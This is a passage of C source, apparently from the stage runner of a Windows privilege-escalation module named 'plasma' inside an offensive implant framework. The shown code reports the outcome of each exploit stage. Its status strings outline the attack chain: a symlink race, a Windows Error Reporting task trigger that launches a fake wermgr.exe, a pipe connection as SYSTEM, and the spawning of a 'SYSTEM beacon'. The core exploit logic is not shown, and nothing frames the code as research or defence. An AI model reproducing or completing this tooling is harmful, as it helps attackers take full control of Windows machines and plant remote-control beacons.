            if (exitCode == 0xDEAD) {
                const char e[] = "[-] plasma: stage 2 timeout (30s) - race did not win\n";
                out_write(e, sizeof(e) - 1);
                SetEnvironmentVariableW(L"CO2H_PLASMA", NULL);
                return;
            }
            if (exitCode != 0) {
                char e[80] = "[-] plasma: stage 2 failed (exit code 0x";
                DWORD ec = exitCode;
                char* p = e + 40;
                for (int sh = 28; sh >= 0; sh -= 4) {
                    int nib = (ec >> sh) & 0xF;
                    *p++ = (char)(nib < 10 ? '0' + nib : 'A' + nib - 10);
                }
                *p++ = ')'; *p++ = '\n'; *p = 0;
                out_write(e, (int)(p - e));
                SetEnvironmentVariableW(L"CO2H_PLASMA", NULL);
                return;
            }
            const char m[] = "[+] plasma: stage 2 done - symlink race won\n";
            out_write(m, sizeof(m) - 1);
        } else if (i == 3) {
            SetEnvironmentVariableW(L"CO2H_PLASMA", NULL);
            if (exitCode == 0) {
                const char m[] = "[+] plasma: SYSTEM beacon spawned successfully\n";
                out_write(m, sizeof(m) - 1);
                return;
            } else if (exitCode == 2) {
                const char e[] = "[-] plasma: stage 3 FAILED - pipe timeout (WER did not launch fake wermgr.exe)\n";
                out_write(e, sizeof(e) - 1);
                return;
            } else if (exitCode == 3) {
                const char e[] = "[-] plasma: stage 3 FAILED - SYSTEM connected but CreateProcessAsUserW failed\n";
                out_write(e, sizeof(e) - 1);
                return;
            } else if (exitCode == 4) {
                const char e[] = "[-] plasma: stage 3 FAILED - WER task trigger failed (COM/TaskScheduler)\n";
                out_write(e, sizeof(e) - 1);
                return;
            } else {
                const char e[] = "[-] plasma: stage 3 FAILED - unknown error\n";
                out_write(e, sizeof(e) - 1);
                return;
            }
        }
    }

    SetEnvironmentVariableW(L"CO2H_PLASMA", NULL);
}
